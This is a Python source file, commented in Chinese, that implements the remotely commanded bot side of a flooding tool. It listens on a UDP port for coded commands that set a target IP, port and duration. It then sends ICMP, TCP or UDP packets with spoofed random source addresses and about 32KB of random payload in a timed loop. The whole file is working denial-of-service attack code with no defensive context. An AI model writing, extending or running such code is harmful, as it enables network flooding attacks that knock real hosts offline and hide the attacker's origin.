import socket           #用於與控制端進行連接的套件
import os               #提供基礎系統相關的功能
import threading        #多執行序
import time             #提供時間的套件
import json             #用於操作json檔
import struct           #用於將二進位資料和Python中的資料類型相互轉換
import random           #亂數套件
import LIV              #自己寫的ˋˊ
from scapy.all import * #用於修改封包並發送

global controlled

class msg:   #設定prefix訊息標籤
    success = F"{LIV.Color.GREEN}[成功]{LIV.Color.RESET}"
    fail = F"{LIV.Color.RED}[錯誤]{LIV.Color.RESET}"

def checksum(msg):
    s = 0xFFFF
    for i in range(0,len(msg)-1,2):
        w = ((ord(msg[i])) << 8) + (ord(msg[i+1]))
        s = s + w
    s = (s >> 16) + (s & 0xFFFF)
    s = s + (s >> 16)
    s = ~s & 0xFFFF
    return s


def MODE_Attack(MODE): #進行封包處理並發動攻擊(MODE = 攻擊模式)

    randmsg = "ABCDEFGHIJKLNMOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz0123456789" #訊息字典
    with open('controlled_seeting.json','r',encoding='utf-8') as jrfile: #讀取設定檔
        setting = json.load(jrfile)
    
    try:
        attack_start_time = time.time()  #設定攻擊開始時間
        attack_end_time = float(attack_start_time) + (float(setting['attack_time'])*60) #設定攻擊結束時間
    except Exception as ex:
        print(F"{msg.fail}讀取資料發生錯誤\n{ex}")
        return
    
    attack_count = 0

    #用於生成一個隨機的資料包-----------------
    packet = ''
    header = struct.pack('bbHHh' , 8, 0, 0, random.randint(1, 65535), 0)
    data = ""
    for i in range(32555):
        data += randmsg[random.randint(0,61)]
    cksum = checksum(header.decode("iso-8859-1")+ data)

    header = struct.pack('bbHHh', 8, 0, socket.htons(cksum), random.randint(1, 65535), 0)
    packet = header.decode("iso-8859-1") + data
    #----------------------------------------
    #創建一個偽造的IP和PORT-------------------
    spoofed_ip= str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
    spoofed_port =random.randint(0, 100)
    #----------------------------------------

    while int(time.time()) < int(attack_end_time): #判斷如果現在時間還到設定的結束時間就持續執行
        attack_count += 1 #攻擊次數計數

        try:
            target_ip, target_port = setting['attack_ip'], setting['attack_port'] #取得攻擊目標IP和PORT
        except Exception as ex:
            print(F"{msg.fail}讀取資料發生錯誤:{ex}")


        if str(MODE) == "ICMP": #(MODE = ICMP)發送ICMP封包
            try:
                ICMP_packet = IP (src=spoofed_ip, dst=target_ip) / ICMP() / packet #將偽造的IP和資料打包成ICMP封包

                send(ICMP_packet,verbose=0)
                print(F"{msg.success}發送成功(ICMP){attack_count}")
            except Exception as ex:
                print(F"{msg.fail}發送失敗(ICMP):{ex}")
        elif str(MODE) == "TCP": #(MODE = TCP)發送TCP封包
            try:
                TCP_packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=spoofed_port, dport=target_port) / packet #將偽造的IP,PORT和資料打包成TCP封包

                send(TCP_packet,verbose=0)
                print(F"{msg.success}發送成功(TCP){attack_count}")
            except Exception as ex:
                print(F"{msg.fail}發送失敗(TCP):{ex}")
        elif str(MODE) == "UDP": #(MODE = UDP)發送UDP封包
            try:
                UDP_packet = IP(src=spoofed_ip, dst=target_ip) / UDP(sport=spoofed_port, dport=target_port )/ packet #將偽造的IP,PORT和資料打包成UDP封包

                send(UDP_packet ,verbose=0)

                print(F"{msg.success}發送成功(UDP){attack_count}")
            except Exception as ex:
                print(F"{msg.fail}發送失敗(UDP):{ex}")


def recv_commands(): #接收控制端的指令
    global controlled
    while True:
        with open('controlled_seeting.json','r',encoding='utf-8') as jrfile: #讀取設定檔
            setting = json.load(jrfile)
        control_commands , control_IP = controlled.recvfrom(1024) #接收指令訊息
        control_commands = str(control_commands.decode()) #將指令訊息解碼
        if control_commands[:6] == "code00": #設定要攻擊的IP
            try:
                setting['attack_ip'] = control_commands[6:]
                print(F"{msg.success}接收指令{control_commands[:6]}:更改攻擊目標({control_commands[6:]})")
            except Exception as ex:
                print(F"{msg.fail}接收指令失敗:{ex}")
            
        elif control_commands[:6] == "code01":#設定攻擊的時間
            try:
                setting['attack_time'] = int(control_commands[6:])
                print(F"{msg.success}接收指令{control_commands[:6]}:更改攻擊時間({control_commands[6:]}分鐘)")
            except Exception as ex:
                print(F"{msg.fail}接收指令失敗:{ex}")

        elif control_commands[:6] == "code02":#發動TCP/UDP/ICMP攻擊
            try:
                print(F"{msg.success}接受指令{control_commands[:6]}:發動{control_commands[6:]}攻擊")
                MODE_Attack(control_commands[6:])        
            except Exception as ex:
                print(F"{msg.fail}接收指令失敗:{ex}")

        elif control_commands[:6] == "code03":#設定要攻擊的PORT
            try:
                setting['attack_port'] = int(control_commands[6:])     
                print(F"{msg.success}接受指令{control_commands[:6]}:更改攻擊目標port({control_commands[6:]})")
            except Exception as ex:
                print(F"{msg.fail}接收指令失敗:{ex}")
        elif control_commands == "連接成功":
            print(F"{msg.success}{control_IP[0]}已連接")
        else:
            print(F"{msg.fail}None")
        
        with open('controlled_seeting.json','w',encoding='utf-8') as jwfile: #儲存設定檔
            json.dump(setting,jwfile)


def setting_controlled_HOST(): #設定自己的IP使控制端能夠連線
    global controlled
    while True:
        #設定本機IP----------------------------------------------------
        host_name = socket.gethostname()
        se = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        se.connect(("8.8.8.8", 80)) #通過建立一個socket對象並連接到Google的DNS服務器來獲取本機的IP地址。
        host_ip = se.getsockname()[0]
        print(F"{LIV.Color.YELLOW}{host_name},{host_ip}")
        controlled = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #--------------------------------------------------------------

        try:
            controlled.bind((host_ip,10)) #開放IP進行連接
            break
        except Exception as ex:
            print(F"{msg.fail}設定IP時有誤\n{ex}")
        time.sleep(3)

    print(F"{msg.success}IP已完成設定")

if __name__ == '__main__':
    #若是當前路徑沒有設定檔自動生成-----------------------
    filename = 'controlled_seeting.json'
    if os.path.isfile(filename):
        pass
    else:
        init_setting = open('controlled_seeting.json','w',encoding='utf-8')
        init_setting.write("{}")
        init_setting.close
    #--------------------------------------------------
    
    setting_controlled_HOST()
    recv_commands()
